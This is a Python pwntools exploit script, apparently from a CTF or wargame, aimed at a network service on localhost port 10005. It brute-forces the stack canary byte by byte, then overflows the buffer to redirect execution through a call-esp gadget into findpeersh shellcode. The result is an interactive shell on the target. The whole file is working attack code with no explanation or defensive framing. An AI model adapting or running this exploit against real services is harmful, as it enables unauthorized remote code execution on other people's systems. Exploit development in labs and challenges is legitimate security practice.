#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")
getLogger('pwnlib.tubes').setLevel('WARNING')

SHELLCODE = asm(shellcraft.findpeersh())
CANARY_OFFSET = 320
RET_OFFSET = 336
CALL_ESP = 0x08048b8c

def brute_canary():
    canary = b''
    pcanary = log.progress('Canary')
    while len(canary) < 4:
        for c in range(256):
            full = canary + bytes([c])
            pcanary.status('0x{:08x}'.format(u32(full + bytes([0] * (4 - len(full))))))
            r = remote('localhost', 10005)
            r.send(flat(-1, fit({ CANARY_OFFSET: full })))
            if b'Goodbye.' in r.recvall():
                canary = full
                break
    pcanary.success('0x%x', u32(canary))
    return canary

CANARY = brute_canary()
r = remote('localhost', 10005)
r.send(flat(-1, fit({
    CANARY_OFFSET: CANARY,
    RET_OFFSET: flat(CALL_ESP, SHELLCODE)
})))
r.interactive()
